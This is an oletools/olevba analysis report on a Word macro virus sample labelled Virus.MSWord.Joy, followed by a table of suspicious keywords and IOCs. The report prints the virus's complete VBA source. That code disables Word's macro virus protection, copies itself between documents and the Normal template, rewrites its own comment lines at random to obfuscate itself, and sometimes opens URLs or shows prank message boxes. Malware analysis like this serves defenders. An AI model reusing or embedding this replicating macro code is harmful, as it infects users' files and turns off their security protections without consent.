olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Joy-ca159609b5a2ec17609a2dc32f8ebcf0a966d383
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Joy-ca159609b5a2ec17609a2dc32f8ebcf0a966d383 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'-#;(8;()';DK3-#;((8K3;DK3-';DK3-;()';DK3-#;((8K3;DK3-';DK3-
Dim rsx, rox, xix As Integer: Dim cix, xic, eox, xoe, oxe, cii, rxe, rex, exr, nix, ixn, nxi, lnr, nrl, rnl As String: Randomize
'3!7.67.'#ABG93!7..6G9ABG93#ABG937.'#ABG93!7..6G9ABG93#ABG93
On Error GoTo 85
'-">(7>((*;CN3-">((7N3;CN3-*;CN3->((*;CN3-">((7N3;CN3-*;CN3-
Options.VirusProtection = False
'5#>08>0)*CDN;5#>008N;CDN;5*CDN;5>0)*CDN;5#>008N;CDN;5*CDN;5
Options.SaveNormalPrompt = False
'. 8)58)&$<AH4. 8))5H4<AH4.$<AH4.8)&$<AH4. 8))5H4<AH4.$<AH4.
Options.ConfirmConversions = False
'2!8-68-'$@BH82!8--6H8@BH82$@BH828-'$@BH82!8--6H8@BH82$@BH82
rt = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines
'."8)78)($<CH4."8))7H4<CH4.$<CH4.8)($<CH4."8))7H4<CH4.$<CH4.
dt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines
'3"8.78.($ACH93"8..7H9ACH93$ACH938.($ACH93"8..7H9ACH93$ACH93
If dt > 0 And rt > 0 Then GoTo 85
'2!8-68-'$@BH82!8--6H8@BH82$@BH828-'$@BH82!8--6H8@BH82$@BH82
If dt = 0 Then
'- 8(58(&$;AH3- 8((5H3;AH3-$;AH3-8(&$;AH3- 8((5H3;AH3-$;AH3-
    Set Joy = NormalTemplate.VBProject.VBComponents
'-"8(78(($;CH3-"8((7H3;CH3-$;CH3-8(($;CH3-"8((7H3;CH3-$;CH3-
    Set hst = ActiveDocument.VBProject.VBComponents
'4'>/<>/-*BHN:4'>//<N:BHN:4*BHN:4>/-*BHN:4'>//<N:BHN:4*BHN:4
    lx = Int(Rnd(1) * 100) + 1
'.$8)98)*$<EH4.$8))9H4<EH4.$<EH4.8)*$<EH4.$8))9H4<EH4.$<EH4.
    If lx = 99 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.ultra.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(74) + Chr(111) + Chr(121)
'5!80680'$CBH;5!8006H;CBH;5$CBH;580'$CBH;5!8006H;CBH;5$CBH;5
    lr = Int(Rnd(1) * 75) + 1
'5 =05=0&)CAM;5 =005M;CAM;5)CAM;5=0&)CAM;5 =005M;CAM;5)CAM;5
    If lr = 74 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.joy.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(74) + Chr(111) + Chr(121)
'."7)77)(#<CG4."7))7G4<CG4.#<CG4.7)(#<CG4."7))7G4<CG4.#<CG4.
    ls = Int(Rnd(1) * 50) + 1
'-#;(8;()';DK3-#;((8K3;DK3-';DK3-;()';DK3-#;((8K3;DK3-';DK3-
    If ls = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83) + Chr(32) + Chr(83) + Chr(65) + Chr(89) + Chr(83) + Chr(32) + Chr(72) + Chr(73)
'-#8(88()$;DH3-#8((8H3;DH3-$;DH3-8()$;DH3-#8((8H3;DH3-$;DH3-
    lt = Int(Rnd(1) * 25) + 1
'.!<)6<)'(<BL4.!<))6L4<BL4.(<BL4.<)'(<BL4.!<))6L4<BL4.(<BL4.
    If lt = 24 Then MsgBox Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(85) + Chr(76) + Chr(84) + Chr(82) + Chr(65) + Chr(32) + Chr(74) + Chr(111) + Chr(121), vbCritical
'3!8.68.'$ABH93!8..6H9ABH93$ABH938.'$ABH93!8..6H9ABH93$ABH93
    hst.Item(1).Name = Joy.Item(1).Name
'-%9(:9(+%;FI3-%9((:I3;FI3-%;FI3-9(+%;FI3-%9((:I3;FI3-%;FI3-
    hst.Item(1).Export Application.StartupPath & Chr(74) + Chr(111) + Chr(121)
'-#7(87()#;DG3-#7((8G3;DG3-#;DG3-7()#;DG3-#7((8G3;DG3-#;DG3-
End If
'.!8)68)'$<BH4.!8))6H4<BH4.$<BH4.8)'$<BH4.!8))6H4<BH4.$<BH4.
If rt = 0 Then Set Joy = ActiveDocument.VBProject.VBComponents
'- 8(58(&$;AH3- 8((5H3;AH3-$;AH3-8(&$;AH3- 8((5H3;AH3-$;AH3-
Joy.Item(1).codemodule.AddFromFile Application.StartupPath & Chr(74) + Chr(111) + Chr(121)
'.#7)87))#<DG4.#7))8G4<DG4.#<DG4.7))#<DG4.#7))8G4<DG4.#<DG4.
With Joy.Item(1).codemodule
'-"7(77((#;CG3-"7((7G3;CG3-#;CG3-7((#;CG3-"7((7G3;CG3-#;CG3-
    For j = 1 To 4
'.$<)9<)*(<EL4.$<))9L4<EL4.(<EL4.<)*(<EL4.$<))9L4<EL4.(<EL4.
    .deletelines 1
'2"8-78-($@CH82"8--7H8@CH82$@CH828-($@CH82"8--7H8@CH82$@CH82
    Next j
'- 9(59(&%;AI3- 9((5I3;AI3-%;AI3-9(&%;AI3- 9((5I3;AI3-%;AI3-
    End With
'0#7+87+)#>DG60#7++8G6>DG60#>DG607+)#>DG60#7++8G6>DG60#>DG60
If dt = 0 Then Joy.Item(1).codemodule.replaceline 1, "Sub AutoClose()"
'.#=)8=)))<DM4.#=))8M4<DM4.)<DM4.=)))<DM4.#=))8M4<DM4.)<DM4.
If dt = 0 Then Joy.Item(1).codemodule.replaceline 91, "Sub ToolsMarco()"
'.$=)9=)*)<EM4.$=))9M4<EM4.)<EM4.=)*)<EM4.$=))9M4<EM4.)<EM4.
If dt = 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'.#9)89))%<DI4.#9))8I4<DI4.%<DI4.9))%<DI4.#9))8I4<DI4.%<DI4.
With Joy.Item(1).codemodule
'.!7)67)'#<BG4.!7))6G4<BG4.#<BG4.7)'#<BG4.!7))6G4<BG4.#<BG4.
    For j = 2 To Joy.Item(1).codemodule.countoflines Step 2
'."9)79)(%<CI4."9))7I4<CI4.%<CI4.9)(%<CI4."9))7I4<CI4.%<CI4.
    rsx = Int(Rnd(11) * 2998) + 24: rox = Int(Rnd(15) * 5863) + 33: xix = Int(Rnd(44) * 3544) + 55
'-%8(:8(+$;FH3-%8((:H3;FH3-$;FH3-8(+$;FH3-%8((:H3;FH3-$;FH3-
    cii = Asc(rsx): eox = Chr$(cii + 2): xoe = Chr$(cii - 9): oxe = Chr$(cii + 10): lnr = Chr$(cii - 4)
'.$7)97)*#<EG4.$7))9G4<EG4.#<EG4.7)*#<EG4.$7))9G4<EG4.#<EG4.
    cix = Asc(rox): rxe = Chr$(cix + 4): rex = Chr$(cix - 11): exr = Chr$(cix + 16): nrl = Chr$(cix - 17)
'2$8-98-*$@EH82$8--9H8@EH82$@EH828-*$@EH82$8--9H8@EH82$@EH82
    xic = Asc(xix): nix = Chr$(xic + 6): ixn = Chr$(xic - 14): nxi = Chr$(xic + 22): rnl = Chr$(xic - 33)
'-$8(98(*$;EH3-$8((9H3;EH3-$;EH3-8(*$;EH3-$8((9H3;EH3-$;EH3-
    .replaceline j, "'" & lnr & nrl & rnl & nix & xoe & rxe & nix & xoe & rex & ixn & oxe & exr & nxi & eox & lnr & nrl & rnl & nix & xoe & xoe & rxe & nxi & eox & oxe & exr & nxi & eox & lnr & ixn & oxe & exr & nxi & eox & lnr & nix & xoe & rex & ixn & oxe & exr & nxi & eox & lnr & nrl & rnl & nix & xoe & xoe & rxe & nxi & eox & oxe & exr & nxi & eox & lnr & ixn & oxe & exr & nxi & eox & lnr
'1#<,8<,)(?DL71#<,,8L7?DL71(?DL71<,)(?DL71#<,,8L7?DL71(?DL71
Next j
'. 7)57)&#<AG4. 7))5G4<AG4.#<AG4.7)&#<AG4. 7))5G4<AG4.#<AG4.
End With
'3%8.:8.+$AFH93%8..:H9AFH93$AFH938.+$AFH93%8..:H9AFH93$AFH93
85:
'5!>06>0'*CBN;5!>006N;CBN;5*CBN;5>0'*CBN;5!>006N;CBN;5*CBN;5
If dt <> 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'2$7-97-*#@EG82$7--9G8@EG82#@EG827-*#@EG82$7--9G8@EG82#@EG82
End Sub
'-$=(9=(*);EM3-$=((9M3;EM3-);EM3-=(*);EM3-$=((9M3;EM3-);EM3-
Sub ToolsMarco()
'0#9+89+)%>DI60#9++8I6>DI60%>DI609+)%>DI60#9++8I6>DI60%>DI60
End Sub
'.$?)9?)*+<EO4.$?))9O4<EO4.+<EO4.?)*+<EO4.$?))9O4<EO4.+<EO4.

'-$8(98(*$;EH3-$8((9H3;EH3-$;EH3-8(*$;EH3-$8((9H3;EH3-$;EH3-

'4 >/5>/&*BAN:4 >//5N:BAN:4*BAN:4>/&*BAN:4 >//5N:BAN:4*BAN:4
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |http://www.ultra.com|URL                                          |
|IOC       |http://www.joy.com  |URL                                          |
+----------+--------------------+---------------------------------------------+

